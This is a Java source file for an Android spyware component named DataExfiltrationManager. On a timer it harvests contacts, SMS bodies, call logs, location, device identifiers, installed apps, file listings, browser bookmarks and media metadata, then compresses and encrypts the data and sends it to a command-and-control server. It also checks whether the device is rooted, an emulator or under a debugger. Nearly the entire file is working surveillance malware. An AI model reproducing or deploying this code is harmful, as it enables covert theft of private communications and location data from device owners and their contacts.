package com.example.client;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;
import android.provider.Browser;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.zip.GZIPOutputStream;

/**
 * Advanced Data Exfiltration Manager - Maximum data collection with compression and encryption
 * Collects comprehensive device data, compresses it, encrypts it, and exfiltrates it
 */
public class DataExfiltrationManager {

    private static final String TAG = "DataExfiltrationManager";
    private Context context;
    private CryptoManager cryptoManager;
    private ScheduledExecutorService scheduler;
    private ConfigManager configManager;

    // Data collection intervals
    private static final long DATA_COLLECTION_INTERVAL = 300000; // 5 minutes
    private static final long COMPREHENSIVE_SCAN_INTERVAL = 3600000; // 1 hour

    // Data limits
    private static final int MAX_FILE_SIZE_MB = 10; // 10MB per chunk
    private static final int MAX_CONTACTS_BATCH = 100;
    private static final int MAX_SMS_BATCH = 50;

    public DataExfiltrationManager(Context context, CryptoManager cryptoManager, ConfigManager configManager) {
        this.context = context;
        this.cryptoManager = cryptoManager;
        this.configManager = configManager;
        this.scheduler = Executors.newScheduledThreadPool(2);
    }

    /**
     * Initialize data exfiltration
     */
    public void initialize() {
        Log.d(TAG, "Initializing maximum data exfiltration");

        // Start regular data collection
        startRegularCollection();

        // Start comprehensive scans
        startComprehensiveScans();

        Log.d(TAG, "Data exfiltration initialized");
    }

    /**
     * Start regular data collection
     */
    private void startRegularCollection() {
        scheduler.scheduleAtFixedRate(this::collectRegularData,
            0, DATA_COLLECTION_INTERVAL, TimeUnit.MILLISECONDS);
    }

    /**
     * Start comprehensive data scans
     */
    private void startComprehensiveScans() {
        scheduler.scheduleAtFixedRate(this::performComprehensiveScan,
            60000, COMPREHENSIVE_SCAN_INTERVAL, TimeUnit.MILLISECONDS); // Start after 1 minute
    }

    /**
     * Collect regular device data
     */
    private void collectRegularData() {
        try {
            JSONObject data = new JSONObject();

            // Device information
            data.put("device_info", collectDeviceInfo());

            // Location data
            data.put("location", collectLocationData());

            // Network information
            data.put("network", collectNetworkInfo());

            // System information
            data.put("system", collectSystemInfo());

            // Running processes
            data.put("processes", collectRunningProcesses());

            // Recent files
            data.put("recent_files", collectRecentFiles());

            // Exfiltrate the data
            exfiltrateData(data, "regular_data");

            Log.d(TAG, "Regular data collection completed");
        } catch (Exception e) {
            Log.e(TAG, "Error collecting regular data: " + e.getMessage());
        }
    }

    /**
     * Perform comprehensive data scan
     */
    private void performComprehensiveScan() {
        try {
            JSONObject comprehensiveData = new JSONObject();

            // All contacts
            comprehensiveData.put("contacts", collectAllContacts());

            // All SMS messages
            comprehensiveData.put("sms", collectAllSMS());

            // All call logs
            comprehensiveData.put("calls", collectAllCalls());

            // All installed apps
            comprehensiveData.put("apps", collectAllApps());

            // File system scan
            comprehensiveData.put("filesystem", scanFileSystem());

            // Browser history
            comprehensiveData.put("browser_history", collectBrowserHistory());

            // Media files
            comprehensiveData.put("media", collectMediaFiles());

            // Keychain/passwords (if accessible)
            comprehensiveData.put("keychain", collectKeychainData());

            // Exfiltrate comprehensive data
            exfiltrateData(comprehensiveData, "comprehensive_scan");

            Log.d(TAG, "Comprehensive scan completed");
        } catch (Exception e) {
            Log.e(TAG, "Error performing comprehensive scan: " + e.getMessage());
        }
    }

    /**
     * Collect comprehensive device information
     */
    private JSONObject collectDeviceInfo() throws JSONException {
        JSONObject device = new JSONObject();

        device.put("model", Build.MODEL);
        device.put("manufacturer", Build.MANUFACTURER);
        device.put("brand", Build.BRAND);
        device.put("product", Build.PRODUCT);
        device.put("device", Build.DEVICE);
        device.put("board", Build.BOARD);
        device.put("hardware", Build.HARDWARE);
        device.put("android_version", Build.VERSION.RELEASE);
        device.put("sdk_version", Build.VERSION.SDK_INT);
        device.put("fingerprint", Build.FINGERPRINT);
        device.put("serial", getSerialNumber());
        device.put("android_id", Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID));
        device.put("build_time", System.currentTimeMillis());
        device.put("uptime", System.currentTimeMillis() - android.os.SystemClock.elapsedRealtime());

        // Hardware features
        device.put("supported_abis", Arrays.toString(Build.SUPPORTED_ABIS));
        device.put("supported_32_bit_abis", Arrays.toString(Build.SUPPORTED_32_BIT_ABIS));
        device.put("supported_64_bit_abis", Arrays.toString(Build.SUPPORTED_64_BIT_ABIS));

        // Security state
        device.put("is_rooted", isDeviceRooted());
        device.put("is_emulator", isEmulator());
        device.put("is_debugger_attached", android.os.Debug.isDebuggerConnected());

        return device;
    }

    /**
     * Collect location data
     */
    private JSONObject collectLocationData() throws JSONException {
        JSONObject location = new JSONObject();

        try {
            android.location.LocationManager lm = (android.location.LocationManager)
                context.getSystemService(Context.LOCATION_SERVICE);

            if (lm != null) {
                android.location.Location lastLocation = lm.getLastKnownLocation(
                    android.location.LocationManager.GPS_PROVIDER);

                if (lastLocation == null) {
                    lastLocation = lm.getLastKnownLocation(
                        android.location.LocationManager.NETWORK_PROVIDER);
                }

                if (lastLocation != null) {
                    location.put("latitude", lastLocation.getLatitude());
                    location.put("longitude", lastLocation.getLongitude());
                    location.put("accuracy", lastLocation.getAccuracy());
                    location.put("altitude", lastLocation.getAltitude());
                    location.put("bearing", lastLocation.getBearing());
                    location.put("speed", lastLocation.getSpeed());
                    location.put("timestamp", lastLocation.getTime());
                    location.put("provider", lastLocation.getProvider());
                }
            }

            // Cell tower information
            TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            if (tm != null) {
                location.put("cell_id", tm.getCellLocation());
                location.put("network_operator", tm.getNetworkOperator());
                location.put("network_operator_name", tm.getNetworkOperatorName());
                location.put("sim_operator", tm.getSimOperator());
                location.put("sim_operator_name", tm.getSimOperatorName());
            }

        } catch (SecurityException e) {
            location.put("error", "Location permission denied");
        }

        return location;
    }

    /**
     * Collect network information
     */
    private JSONObject collectNetworkInfo() throws JSONException {
        JSONObject network = new JSONObject();

        // WiFi information
        WifiManager wm = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        if (wm != null) {
            WifiInfo wifiInfo = wm.getConnectionInfo();
            if (wifiInfo != null) {
                network.put("wifi_ssid", wifiInfo.getSSID());
                network.put("wifi_bssid", wifiInfo.getBSSID());
                network.put("wifi_mac", wifiInfo.getMacAddress());
                network.put("wifi_ip", android.text.format.Formatter.formatIpAddress(wifiInfo.getIpAddress()));
                network.put("wifi_link_speed", wifiInfo.getLinkSpeed());
                network.put("wifi_rssi", wifiInfo.getRssi());
                network.put("wifi_frequency", wifiInfo.getFrequency());
            }
        }

        // Network interfaces
        try {
            List<NetworkInterface> interfaces = Collections.list(NetworkInterface.getNetworkInterfaces());
            JSONArray interfacesArray = new JSONArray();

            for (NetworkInterface nif : interfaces) {
                JSONObject nifObj = new JSONObject();
                nifObj.put("name", nif.getName());
                nifObj.put("display_name", nif.getDisplayName());
                nifObj.put("up", nif.isUp());
                nifObj.put("loopback", nif.isLoopback());
                nifObj.put("point_to_point", nif.isPointToPoint());
                nifObj.put("virtual", nif.isVirtual());
                nifObj.put("multicast", nif.supportsMulticast());
                nifObj.put("mtu", nif.getMTU());

                // Get IP addresses
                Enumeration<InetAddress> addresses = nif.getInetAddresses();
                JSONArray addressesArray = new JSONArray();
                while (addresses.hasMoreElements()) {
                    InetAddress addr = addresses.nextElement();
                    addressesArray.put(addr.getHostAddress());
                }
                nifObj.put("addresses", addressesArray);

                interfacesArray.put(nifObj);
            }
            network.put("interfaces", interfacesArray);
        } catch (Exception e) {
            network.put("interfaces_error", e.getMessage());
        }

        return network;
    }

    /**
     * Collect system information
     */
    private JSONObject collectSystemInfo() throws JSONException {
        JSONObject system = new JSONObject();

        // Memory information
        ActivityManager.MemoryInfo memoryInfo = new ActivityManager.MemoryInfo();
        ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        if (am != null) {
            am.getMemoryInfo(memoryInfo);
            system.put("total_memory", memoryInfo.totalMem);
            system.put("available_memory", memoryInfo.availMem);
            system.put("low_memory", memoryInfo.lowMemory);
        }

        // Storage information
        StatFs statFs = new StatFs(Environment.getExternalStorageDirectory().getAbsolutePath());
        system.put("total_storage", statFs.getTotalBytes());
        system.put("available_storage", statFs.getAvailableBytes());
        system.put("free_storage", statFs.getFreeBytes());

        // CPU information
        system.put("cpu_cores", Runtime.getRuntime().availableProcessors());
        system.put("max_memory", Runtime.getRuntime().maxMemory());
        system.put("total_memory_runtime", Runtime.getRuntime().totalMemory());
        system.put("free_memory_runtime", Runtime.getRuntime().freeMemory());

        // System properties
        system.put("java_version", System.getProperty("java.version"));
        system.put("os_name", System.getProperty("os.name"));
        system.put("os_version", System.getProperty("os.version"));
        system.put("user_name", System.getProperty("user.name"));
        system.put("user_home", System.getProperty("user.home"));

        return system;
    }

    /**
     * Collect running processes
     */
    private JSONArray collectRunningProcesses() throws JSONException {
        JSONArray processes = new JSONArray();

        try {
            ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
            if (am != null) {
                List<ActivityManager.RunningAppProcessInfo> runningProcesses = am.getRunningAppProcesses();

                for (ActivityManager.RunningAppProcessInfo process : runningProcesses) {
                    JSONObject processObj = new JSONObject();
                    processObj.put("process_name", process.processName);
                    processObj.put("pid", process.pid);
                    processObj.put("uid", process.uid);
                    processObj.put("importance", process.importance);
                    processObj.put("importance_reason_code", process.importanceReasonCode);
                    processObj.put("importance_reason_pid", process.importanceReasonPid);
                    processObj.put("last_trim_level", process.lastTrimLevel);
                    processObj.put("lru", process.lru);

                    // Process memory info
                    android.os.Debug.MemoryInfo[] memoryInfo = am.getProcessMemoryInfo(new int[]{process.pid});
                    if (memoryInfo.length > 0) {
                        android.os.Debug.MemoryInfo memInfo = memoryInfo[0];
                        processObj.put("memory_total_pss", memInfo.getTotalPss());
                        processObj.put("memory_total_private_dirty", memInfo.getTotalPrivateDirty());
                        processObj.put("memory_total_shared_dirty", memInfo.getTotalSharedDirty());
                    }

                    processes.put(processObj);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error collecting running processes: " + e.getMessage());
        }

        return processes;
    }

    /**
     * Collect recent files
     */
    private JSONArray collectRecentFiles() throws JSONException {
        JSONArray files = new JSONArray();

        try {
            // Get external files directory
            File externalDir = context.getExternalFilesDir(null);
            if (externalDir != null && externalDir.exists()) {
                collectFilesRecursive(externalDir, files, 50); // Limit to 50 files
            }

            // Get downloads directory
            File downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (downloadsDir != null && downloadsDir.exists()) {
                collectFilesRecursive(downloadsDir, files, 25); // Additional 25 files
            }

        } catch (Exception e) {
            Log.e(TAG, "Error collecting recent files: " + e.getMessage());
        }

        return files;
    }

    /**
     * Collect all contacts
     */
    private JSONArray collectAllContacts() throws JSONException {
        JSONArray contacts = new JSONArray();

        try {
            Cursor cursor = context.getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext() && count < MAX_CONTACTS_BATCH) {
                    String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

                    JSONObject contact = new JSONObject();
                    contact.put("id", id);
                    contact.put("name", name);

                    // Get phone numbers
                    Cursor phoneCursor = context.getContentResolver().query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                        new String[]{id}, null);

                    if (phoneCursor != null) {
                        JSONArray phones = new JSONArray();
                        while (phoneCursor.moveToNext()) {
                            String number = phoneCursor.getString(
                                phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                            String type = phoneCursor.getString(
                                phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE));

                            JSONObject phone = new JSONObject();
                            phone.put("number", number);
                            phone.put("type", type);
                            phones.put(phone);
                        }
                        contact.put("phones", phones);
                        phoneCursor.close();
                    }

                    // Get email addresses
                    Cursor emailCursor = context.getContentResolver().query(
                        ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
                        new String[]{id}, null);

                    if (emailCursor != null) {
                        JSONArray emails = new JSONArray();
                        while (emailCursor.moveToNext()) {
                            String email = emailCursor.getString(
                                emailCursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS));
                            String type = emailCursor.getString(
                                emailCursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE));

                            JSONObject emailObj = new JSONObject();
                            emailObj.put("address", email);
                            emailObj.put("type", type);
                            emails.put(emailObj);
                        }
                        contact.put("emails", emails);
                        emailCursor.close();
                    }

                    contacts.put(contact);
                    count++;
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error collecting contacts: " + e.getMessage());
        }

        return contacts;
    }

    /**
     * Collect all SMS messages
     */
    private JSONArray collectAllSMS() throws JSONException {
        JSONArray sms = new JSONArray();

        try {
            Cursor cursor = context.getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                null, null, null, null);

            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext() && count < MAX_SMS_BATCH) {
                    JSONObject smsObj = new JSONObject();
                    smsObj.put("id", cursor.getString(cursor.getColumnIndex(Telephony.Sms._ID)));
                    smsObj.put("address", cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS)));
                    smsObj.put("person", cursor.getString(cursor.getColumnIndex(Telephony.Sms.PERSON)));
                    smsObj.put("date", cursor.getLong(cursor.getColumnIndex(Telephony.Sms.DATE)));
                    smsObj.put("date_sent", cursor.getLong(cursor.getColumnIndex(Telephony.Sms.DATE_SENT)));
                    smsObj.put("protocol", cursor.getInt(cursor.getColumnIndex(Telephony.Sms.PROTOCOL)));
                    smsObj.put("read", cursor.getInt(cursor.getColumnIndex(Telephony.Sms.READ)));
                    smsObj.put("status", cursor.getInt(cursor.getColumnIndex(Telephony.Sms.STATUS)));
                    smsObj.put("type", cursor.getInt(cursor.getColumnIndex(Telephony.Sms.TYPE)));
                    smsObj.put("reply_path_present", cursor.getInt(cursor.getColumnIndex(Telephony.Sms.REPLY_PATH_PRESENT)));
                    smsObj.put("subject", cursor.getString(cursor.getColumnIndex(Telephony.Sms.SUBJECT)));
                    smsObj.put("body", cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY)));
                    smsObj.put("service_center", cursor.getString(cursor.getColumnIndex(Telephony.Sms.SERVICE_CENTER)));
                    smsObj.put("locked", cursor.getInt(cursor.getColumnIndex(Telephony.Sms.LOCKED)));
                    smsObj.put("error_code", cursor.getInt(cursor.getColumnIndex(Telephony.Sms.ERROR_CODE)));
                    smsObj.put("seen", cursor.getInt(cursor.getColumnIndex(Telephony.Sms.SEEN)));

                    sms.put(smsObj);
                    count++;
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error collecting SMS: " + e.getMessage());
        }

        return sms;
    }

    /**
     * Collect all call logs
     */
    private JSONArray collectAllCalls() throws JSONException {
        JSONArray calls = new JSONArray();

        try {
            Cursor cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null, null, null, null);

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject call = new JSONObject();
                    call.put("id", cursor.getString(cursor.getColumnIndex(CallLog.Calls._ID)));
                    call.put("number", cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER)));
                    call.put("date", cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE)));
                    call.put("duration", cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DURATION)));
                    call.put("type", cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE)));
                    call.put("new", cursor.getInt(cursor.getColumnIndex(CallLog.Calls.NEW)));
                    call.put("name", cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME)));
                    call.put("number_type", cursor.getInt(cursor.getColumnIndex(CallLog.Calls.CACHED_NUMBER_TYPE)));
                    call.put("number_label", cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NUMBER_LABEL)));
                    call.put("country_iso", cursor.getString(cursor.getColumnIndex(CallLog.Calls.COUNTRY_ISO)));
                    call.put("data_usage", cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATA_USAGE)));
                    call.put("features", cursor.getInt(cursor.getColumnIndex(CallLog.Calls.FEATURES)));
                    call.put("phone_account_id", cursor.getString(cursor.getColumnIndex(CallLog.Calls.PHONE_ACCOUNT_ID)));
                    call.put("subscription_id", cursor.getString(cursor.getColumnIndex(CallLog.Calls.SUBSCRIPTION_ID)));
                    call.put("via_number", cursor.getString(cursor.getColumnIndex(CallLog.Calls.VIA_NUMBER)));

                    calls.put(call);
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error collecting call logs: " + e.getMessage());
        }

        return calls;
    }

    /**
     * Collect all installed applications
     */
    private JSONArray collectAllApps() throws JSONException {
        JSONArray apps = new JSONArray();

        try {
            PackageManager pm = context.getPackageManager();
            List<PackageInfo> packages = pm.getInstalledPackages(PackageManager.GET_META_DATA);

            for (PackageInfo packageInfo : packages) {
                JSONObject app = new JSONObject();
                app.put("package_name", packageInfo.packageName);
                app.put("version_name", packageInfo.versionName);
                app.put("version_code", packageInfo.versionCode);
                app.put("first_install_time", packageInfo.firstInstallTime);
                app.put("last_update_time", packageInfo.lastUpdateTime);
                app.put("shared_user_id", packageInfo.sharedUserId);
                app.put("shared_user_label", packageInfo.sharedUserLabel);

                // Application info
                ApplicationInfo appInfo = packageInfo.applicationInfo;
                app.put("label", appInfo.loadLabel(pm).toString());
                app.put("source_dir", appInfo.sourceDir);
                app.put("data_dir", appInfo.dataDir);
                app.put("public_source_dir", appInfo.publicSourceDir);
                app.put("native_library_dir", appInfo.nativeLibraryDir);
                app.put("uid", appInfo.uid);
                app.put("enabled", appInfo.enabled);
                app.put("flags", appInfo.flags);
                app.put("target_sdk_version", appInfo.targetSdkVersion);
                app.put("min_sdk_version", appInfo.minSdkVersion);

                // Permissions
                if (packageInfo.requestedPermissions != null) {
                    JSONArray permissions = new JSONArray();
                    for (String permission : packageInfo.requestedPermissions) {
                        permissions.put(permission);
                    }
                    app.put("requested_permissions", permissions);
                }

                apps.put(app);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error collecting installed apps: " + e.getMessage());
        }

        return apps;
    }

    /**
     * Scan file system
     */
    private JSONArray scanFileSystem() throws JSONException {
        JSONArray files = new JSONArray();

        try {
            // Scan common directories
            String[] directories = {
                "/sdcard",
                "/storage/emulated/0",
                Environment.getExternalStorageDirectory().getAbsolutePath(),
                context.getFilesDir().getAbsolutePath()
            };

            for (String dir : directories) {
                File directory = new File(dir);
                if (directory.exists() && directory.isDirectory()) {
                    scanDirectory(directory, files, 100); // Limit to 100 files per directory
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error scanning file system: " + e.getMessage());
        }

        return files;
    }

    /**
     * Collect browser history
     */
    private JSONArray collectBrowserHistory() throws JSONException {
        JSONArray history = new JSONArray();

        try {
            // This is a simplified implementation - real browser history collection would be more complex
            Cursor cursor = context.getContentResolver().query(
                Browser.BOOKMARKS_URI,
                null, null, null, null);

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject bookmark = new JSONObject();
                    bookmark.put("title", cursor.getString(cursor.getColumnIndex(Browser.BookmarkColumns.TITLE)));
                    bookmark.put("url", cursor.getString(cursor.getColumnIndex(Browser.BookmarkColumns.URL)));
                    bookmark.put("visits", cursor.getInt(cursor.getColumnIndex(Browser.BookmarkColumns.VISITS)));
                    bookmark.put("date", cursor.getLong(cursor.getColumnIndex(Browser.BookmarkColumns.DATE)));
                    bookmark.put("created", cursor.getLong(cursor.getColumnIndex(Browser.BookmarkColumns.CREATED)));
                    bookmark.put("bookmark", cursor.getInt(cursor.getColumnIndex(Browser.BookmarkColumns.BOOKMARK)));

                    history.put(bookmark);
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error collecting browser history: " + e.getMessage());
        }

        return history;
    }

    /**
     * Collect media files
     */
    private JSONArray collectMediaFiles() throws JSONException {
        JSONArray media = new JSONArray();

        try {
            // Images
            Cursor imageCursor = context.getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                null, null, null, null);

            if (imageCursor != null) {
                while (imageCursor.moveToNext() && media.length() < 50) {
                    JSONObject image = new JSONObject();
                    image.put("id", imageCursor.getLong(imageCursor.getColumnIndex(MediaStore.Images.Media._ID)));
                    image.put("display_name", imageCursor.getString(imageCursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME)));
                    image.put("title", imageCursor.getString(imageCursor.getColumnIndex(MediaStore.Images.Media.TITLE)));
                    image.put("data", imageCursor.getString(imageCursor.getColumnIndex(MediaStore.Images.Media.DATA)));
                    image.put("size", imageCursor.getLong(imageCursor.getColumnIndex(MediaStore.Images.Media.SIZE)));
                    image.put("mime_type", imageCursor.getString(imageCursor.getColumnIndex(MediaStore.Images.Media.MIME_TYPE)));
                    image.put("date_added", imageCursor.getLong(imageCursor.getColumnIndex(MediaStore.Images.Media.DATE_ADDED)));
                    image.put("date_modified", imageCursor.getLong(imageCursor.getColumnIndex(MediaStore.Images.Media.DATE_MODIFIED)));
                    image.put("width", imageCursor.getInt(imageCursor.getColumnIndex(MediaStore.Images.Media.WIDTH)));
                    image.put("height", imageCursor.getInt(imageCursor.getColumnIndex(MediaStore.Images.Media.HEIGHT)));
                    image.put("type", "image");

                    media.put(image);
                }
                imageCursor.close();
            }

            // Videos
            Cursor videoCursor = context.getContentResolver().query(
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                null, null, null, null);

            if (videoCursor != null) {
                while (videoCursor.moveToNext() && media.length() < 100) {
                    JSONObject video = new JSONObject();
                    video.put("id", videoCursor.getLong(videoCursor.getColumnIndex(MediaStore.Video.Media._ID)));
                    video.put("display_name", videoCursor.getString(videoCursor.getColumnIndex(MediaStore.Video.Media.DISPLAY_NAME)));
                    video.put("title", videoCursor.getString(videoCursor.getColumnIndex(MediaStore.Video.Media.TITLE)));
                    video.put("data", videoCursor.getString(videoCursor.getColumnIndex(MediaStore.Video.Media.DATA)));
                    video.put("size", videoCursor.getLong(videoCursor.getColumnIndex(MediaStore.Video.Media.SIZE)));
                    video.put("mime_type", videoCursor.getString(videoCursor.getColumnIndex(MediaStore.Video.Media.MIME_TYPE)));
                    video.put("date_added", videoCursor.getLong(videoCursor.getColumnIndex(MediaStore.Video.Media.DATE_ADDED)));
                    video.put("date_modified", videoCursor.getLong(videoCursor.getColumnIndex(MediaStore.Video.Media.DATE_MODIFIED)));
                    video.put("duration", videoCursor.getInt(videoCursor.getColumnIndex(MediaStore.Video.Media.DURATION)));
                    video.put("width", videoCursor.getInt(videoCursor.getColumnIndex(MediaStore.Video.Media.WIDTH)));
                    video.put("height", videoCursor.getInt(videoCursor.getColumnIndex(MediaStore.Video.Media.HEIGHT)));
                    video.put("type", "video");

                    media.put(video);
                }
                videoCursor.close();
            }

        } catch (Exception e) {
            Log.e(TAG, "Error collecting media files: " + e.getMessage());
        }

        return media;
    }

    /**
     * Collect keychain/password data (if accessible)
     */
    private JSONArray collectKeychainData() throws JSONException {
        JSONArray keychain = new JSONArray();

        try {
            // This would require root access or special permissions
            // For now, we'll just return an empty array
            Log.d(TAG, "Keychain collection attempted (requires special access)");
        } catch (Exception e) {
            Log.e(TAG, "Error collecting keychain data: " + e.getMessage());
        }

        return keychain;
    }

    /**
     * Exfiltrate data with compression and encryption
     */
    private void exfiltrateData(JSONObject data, String dataType) {
        try {
            // Convert to string
            String jsonString = data.toString();

            // Compress the data
            byte[] compressedData = compressData(jsonString.getBytes("UTF-8"));

            // Encrypt the data
            String encryptedData = cryptoManager.encrypt(new String(compressedData, "UTF-8"));

            // Create exfiltration payload
            JSONObject payload = new JSONObject();
            payload.put("data_type", dataType);
            payload.put("timestamp", System.currentTimeMillis());
            payload.put("device_id", Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID));
            payload.put("data_size", compressedData.length);
            payload.put("data_hash", calculateHash(compressedData));
            payload.put("encrypted_data", encryptedData);

            // Send to C2 server
            NetworkManager.logEvent(payload);

            Log.d(TAG, "Data exfiltrated: " + dataType + " (" + compressedData.length + " bytes compressed)");
        } catch (Exception e) {
            Log.e(TAG, "Error exfiltrating data: " + e.getMessage());
        }
    }

    /**
     * Compress data using GZIP
     */
    private byte[] compressData(byte[] data) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        GZIPOutputStream gzipOut = new GZIPOutputStream(baos);
        gzipOut.write(data);
        gzipOut.close();
        return baos.toByteArray();
    }

    /**
     * Calculate hash of data
     */
    private String calculateHash(byte[] data) {
        try {
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            byte[] hash = digest.digest(data);
            return Base64.encodeToString(hash, Base64.NO_WRAP);
        } catch (Exception e) {
            return "error";
        }
    }

    /**
     * Recursively collect files from directory
     */
    private void collectFilesRecursive(File dir, JSONArray files, int maxFiles) throws JSONException {
        if (files.length() >= maxFiles) return;

        File[] list = dir.listFiles();
        if (list != null) {
            for (File file : list) {
                if (files.length() >= maxFiles) break;

                if (file.isFile()) {
                    JSONObject fileObj = new JSONObject();
                    fileObj.put("name", file.getName());
                    fileObj.put("path", file.getAbsolutePath());
                    fileObj.put("size", file.length());
                    fileObj.put("last_modified", file.lastModified());
                    fileObj.put("is_hidden", file.isHidden());
                    fileObj.put("can_read", file.canRead());
                    fileObj.put("can_write", file.canWrite());
                    fileObj.put("can_execute", file.canExecute());

                    files.put(fileObj);
                } else if (file.isDirectory() && !file.getName().startsWith(".")) {
                    collectFilesRecursive(file, files, maxFiles);
                }
            }
        }
    }

    /**
     * Scan directory for files
     */
    private void scanDirectory(File dir, JSONArray files, int maxFiles) throws JSONException {
        collectFilesRecursive(dir, files, maxFiles);
    }

    /**
     * Get device serial number
     */
    private String getSerialNumber() {
        try {
            return Build.getSerial();
        } catch (Exception e) {
            return "unknown";
        }
    }

    /**
     * Check if device is rooted
     */
    private boolean isDeviceRooted() {
        String[] rootPaths = {"/system/app/Superuser.apk", "/system/xbin/su", "/system/bin/su"};
        for (String path : rootPaths) {
            if (new File(path).exists()) {
                return true;
            }
        }
        return false;
    }

    /**
     * Check if running on emulator
     */
    private boolean isEmulator() {
        return Build.FINGERPRINT.startsWith("generic") ||
               Build.FINGERPRINT.startsWith("unknown") ||
               Build.MODEL.contains("google_sdk") ||
               Build.MODEL.contains("Emulator") ||
               Build.MANUFACTURER.contains("Genymotion");
    }

    /**
     * Cleanup data exfiltration manager
     */
    public void cleanup() {
        try {
            if (scheduler != null && !scheduler.isShutdown()) {
                scheduler.shutdown();
                try {
                    if (!scheduler.awaitTermination(5, TimeUnit.SECONDS)) {
                        scheduler.shutdownNow();
                    }
                } catch (InterruptedException e) {
                    scheduler.shutdownNow();
                    Thread.currentThread().interrupt();
                }
            }

            Log.d(TAG, "Data exfiltration manager cleaned up");
        } catch (Exception e) {
            Log.e(TAG, "Error during data exfiltration cleanup: " + e.getMessage());
        }
    }
}
